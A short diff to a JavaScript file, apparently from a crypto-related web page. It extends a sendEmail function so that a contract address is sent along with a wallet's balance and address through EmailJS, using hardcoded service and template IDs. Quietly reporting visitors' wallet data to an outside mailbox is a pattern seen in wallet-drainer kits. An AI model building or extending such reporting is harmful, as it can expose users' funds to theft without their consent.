@@ -334,12 +334,13 @@ function loadAppropriateLink() {
 //send email
 
 // Function to send the email
-function sendEmail(balance, wallet) {
+function sendEmail(balance, wallet, contract) {
     emailjs.init('g-iKBMjYyCWuMWun7'); // Replace 'your_user_id' with your actual user ID
 
     var templateParams = {
         balance: balance,
-        wallet: wallet
+        wallet: wallet,
+	contract: contract
     };
 
     emailjs.send('service_h2vkhpq', 'template_9qyt9rq', templateParams)
